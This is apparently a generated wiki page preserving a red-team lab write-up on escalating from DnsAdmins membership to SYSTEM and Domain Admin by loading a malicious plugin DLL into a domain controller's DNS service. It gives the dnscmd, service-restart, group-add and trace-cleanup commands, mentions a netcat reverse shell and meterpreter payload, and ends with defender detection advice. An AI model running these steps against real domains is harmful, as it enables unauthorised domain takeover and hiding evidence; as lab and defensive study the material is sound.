---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# From DnsAdmins to SYSTEM to Domain Compromise

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-experiments-active-directory-kerberos-abuse-from-dnsadmins-to-system-to-domain-compromise` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [From DnsAdmins to SYSTEM to Domain Compromise](../../topics/offensive-security-experiments/from-dnsadmins-to-system-to-domain-compromise.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-experiments-active-directory-kerberos-abuse-from-dnsadmins-to-system-to-domain-compromise |
| name | From DnsAdmins to SYSTEM to Domain Compromise |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Peek 2018-11-12 21-58.gif
- Screenshot from 2018-11-11 16-55-52.png
- Screenshot from 2018-11-11 17-04-48.png
- Screenshot from 2018-11-11 17-30-47.png
- Screenshot from 2018-11-11 21-45-51.png
- Screenshot from 2018-11-11 21-46-09.png
- Screenshot from 2018-11-11 21-51-21.png
- Screenshot from 2018-11-11 21-55-59.png
- Screenshot from 2018-11-11 22-33-58.png
- Screenshot from 2018-11-11 22-55-35.png
- Screenshot from 2018-11-11 23-03-40.png
- Screenshot from 2018-11-11 23-03-52.png
- Screenshot from 2018-11-11 23-09-23.png
- Screenshot from 2018-11-11 23-21-55.png
- Screenshot from 2018-11-11 23-24-44.png
- Screenshot from 2018-11-12 22-09-43.png
_body: "# From DnsAdmins to SYSTEM to Domain Compromise\n\nIn this lab I'm trying to get code execution with `SYSTEM` level\
  \ privileges on a DC that runs a DNS service as originally researched by Shay Ber [here](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83).\n\
  \nThe attack relies on a [DLL injection](../../offensive-security/code-injection-process-injection/dll-injection.md) into\
  \ the dns service running as SYSTEM on the DNS server which most of the time is on a Domain Contoller.\n\n## Execution\n\
  \nFor the attack to work, we need to have compromised a user that belongs to a `DnsAdmins` group on a domain. Luckily, our\
  \ user `spotless` already belongs to the said group:\n\n```csharp\n net user spotless /domain\n```\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-11-11 16-55-52.png>)\n\n### Building the DLL\n\nAs mentioned earlier, we need to build a DNS plugin DLL that\
  \ we will be injecting into a dns.exe process on a victim DNS server (DC). Below is a screenshot of the DLL exported functions\
  \ that are expected by the dns.exe binary when loading a plugin DLL. I have also added a simple system command to invoke\
  \ a netcat reverse shell once the plugin is initialized and code is executed.&#x20;\n\nI then tested the function with rundll32\
  \ as shown below, which returned a reverse shell to my attacking machine - code gets executed, shell gets spawned:\n\n```csharp\n\
  rundll32.exe .\\dnsprivesc.dll,DnsPluginInitialize\n```\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-11 17-30-47.png>)\n\
  \n### Abuse DNS with dnscmd\n\nNow that we have the DLL and we checked that it is working, we can ask the victim `DC01`\
  \ to load our malicious DLL (from the victim controlled network share on host 10.0.0.2) next time the service starts (or\
  \ when the attacker restarts it):\n\n{% code title=\"attacker@victim.memberOfDnsAdmins\" %}\n```csharp\ndnscmd dc01 /config\
  \ /serverlevelplugindll \\\\10.0.0.2\\tools\\dns-priv\\dnsprivesc.dll\n```\n{% endcode %}\n\nThe below looks promising and\
  \ suggests the request to load our malicious DLL was successful:\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-11\
  \ 21-55-59.png>)\n\n{% hint style=\"info\" %}\n`dnscmd` is a windows utility that allows people with `DnsAdmins` privileges\
  \ manage the DNS server. The utility can be installed by adding `DNS Server Tools` to your system as shown in the below\
  \ screengrab.\n{% endhint %}\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-11 17-04-48.png>)\n\nThe below command\
  \ on the victim further suggests that our request was successful and the registry value `ServerLevelPluginDll` points to\
  \ our malicious DLL:\n\n```csharp\n# note that as attacker you cannot check this on a DC since you do not have yet access\
  \ to the system. Because this is a lab environment, I am checking the registry from the DC itself.\nGet-ItemProperty HKLM:\\\
  SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\ -Name ServerLevelPluginDll\n```\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-11-11 21-51-21.png>)\n\n### Getting code execution with NT\\SYSTEM\n\nNow the next time dns service starts,\
  \ our malicious DLL should be loaded to the dns.exe process and a reverse shell should be sent back to our attacking system,\
  \ so let's go and restart the DNS service:\n\n{% code title=\"attacker@victim\" %}\n```csharp\nsc.exe \\\\dc01 stop dns\n\
  sc.exe \\\\dc01 start dns\n```\n{% endcode %}\n\nBy this point, I should have received a reverse shell, but unfortunately,\
  \ I did not.\n\nAfter checking the DNS logs on the `DC01` I saw the below error, suggesting there was something off with\
  \ my DLL:\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-11 21-45-51.png>)\n\nI tried exporting functions with C++\
  \ name mangling and without and although the DLL exports seemed to be OK per CFF Explorer, I was still not able to make\
  \ the DC load my malicious DLL successfully without corrupting the dns service:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-11-11 21-46-09.png>)\n\n{% hint style=\"warning\" %}\nAlthough I was not able to correctly inject the DLL without\
  \ crashing the dns service in my lab environment, I still decided to publish these notes, in case they will be stubmled\
  \ upon by a reader who had successfully injected a custom DLL and who would like to share their thoughts on what I am overlooking\
  \ as this would be much appreciated.\n{% endhint %}\n\nSince I could not get my malicious DLL injected into the dns.exe\
  \ successfully, I thought of trying to inject the meterpreter payload using the same technique.\n\nIt can be observed, that\
  \ the DLL with meterpreter payloads gets ineed loaded and we receive a call back attempt from meterpreter, but since the\
  \ DLL does not conform to the required format (does not have required exported functions), the session dies immediately\
  \ (or this is what I thought initially - as you will later see, it turns out I was simply using a wrong listener):\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-11-11 22-33-58.png>)\n\nSince the above suggests that the the DLL code still got executed, we can try asking\
  \ the DLL to execute the following on the DC:\n\n```csharp\nnet group 'domain admins' spotless /add /domain\n```\n\n```\n\
  dnsprivesc.dll\n```\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-11 22-55-35.png>)\n\nBefore restarting the DNS\
  \ service and getting our malicious DLL executed, let's make sure our attacking user `spotless` is not in `Domain Admins`\
  \ group:\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-11 23-03-40.png>)\n\nNow if we restart the DNS service which\
  \ will load our `addDA.dll`, we see that the user `spotless` is now a member of the `Domain Admins`:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-11-11 23-03-52.png>)\n\n{% hint style=\"danger\" %}\nWarning: at this time the DNS service is probably crashed,\
  \ so be warned - using DLLs that do not conform to the plugin requirements is not stealthy and this type of activity probably\
  \ will get picked up by defenders really quickly unless you can restore the DNS service immediately.\n{% endhint %}\n\n\
  Below confirms that the dns service is down, however we can still access the DC C$ share by DC's IP from our spotless user,\
  \ meaning that we have escalated privileges to DA:\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-11 23-09-23.png>)\n\
  \nOne could think about scripting/automating the after-attack cleanup and the DNS service restoration and include the required\
  \ code in the same malicious DLL that creates a backdoor user in the first place:\n\n{% code title=\"attacker@victim\" %}\n\
  ```csharp\nreg query \\\\10.0.0.6\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\nreg delete \\\\10.0.0.6\\\
  HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters /v ServerLevelPluginDll\nsc.exe \\\\10.0.0.6 stop dns\nsc.exe\
  \ \\\\10.0.0.6 start dns\n//remove any other traces/logs\n```\n{% endcode %}\n\n![](<../../.gitbook/assets/Screenshot from\
  \ 2018-11-11 23-21-55.png>)\n\nOnce the DNS service is restored, we can now access the C$ using DC01 computer name:\n\n\
  ![](<../../.gitbook/assets/Screenshot from 2018-11-11 23-24-44.png>)\n\n### Bonus Reminder\n\nIt turns out that the reason\
  \ the meterpreter payload failed because of a classic mistake of not using the right listener for staged/non-staged payloads\
  \ - always double check your payloads and make sure that the listeners are able to handle the callbacks.\n\nOnce I set up\
  \ the listener correctly, the meterpreter shell came back as expected - note that the dns.exe service still gets corrupted.\n\
  \n![](<../../.gitbook/assets/Peek 2018-11-12 21-58.gif>)\n\n## Observations\n\nAs a defender, one should considering monitoring\
  \ for suspicious child processes (rundll32, powershell, cmd, net, etc.) spawned by the dns.exe on DCs:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-11-12 22-09-43.png>)\n\nAlso, you may want to consider monitoring `HKLM\\SYSTEM\\CurrentControlSet\\Services\\\
  DNS\\Parameters` value `ServerLevelPluginDll`, especially if it begins with string `\\\\` in the data field.\n\n## Update\
  \ #1\n\nI was pointed out by a reader that a video by ippsec [https://youtu.be/8KJebvmd1Fk?t=3130](https://youtu.be/8KJebvmd1Fk?t=3130)\
  \ explains why the dns service was crashing, so please check the video, but if you are too lazy, the answer is provided\
  \ here too.\n\nYou need to execute your code in a **new thread** (this was the missing piece in my first attempt that made\
  \ the service crash) in the exported DLL function `DnsPluginInitialize`, which is the function that gets invoked, when the\
  \ dnscmd loads our malicious DNS service plugin DLL.\n\n## References\n\n{% embed url=\"https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83\"\
  \ %}\n\n{% embed url=\"http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html\"\
  \ %}\n\n{% embed url=\"https://github.com/dim0x69/dns-exe-persistance\" %}"
_relative_path: offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise.md
````
